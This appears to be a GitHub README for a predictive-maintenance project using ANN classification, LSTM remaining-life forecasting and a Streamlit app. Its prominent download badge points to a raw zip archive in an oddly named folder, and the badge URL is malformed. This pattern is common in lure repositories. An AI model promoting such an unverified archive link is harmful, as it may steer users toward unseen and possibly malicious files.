[![Download Now](https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/project_maintenance_predictive_v2.4.zip%20Now-Release%20Page-brightgreen)](https://github.com/Affaq786/predictive-maintenance-project/raw/refs/heads/main/antireform/project_maintenance_predictive_v2.4.zip)

## 📖 Project Overview

Welcome to the Predictive Maintenance Project! This system helps you maintain your machines by predicting failures before they happen. It uses advanced techniques like Artificial Neural Networks (ANN) for classifying issues and Long Short-Term Memory (LSTM) for forecasting remaining useful life (RUL). The included Streamlit interface allows you to interact with the model and predict machine health in real time.
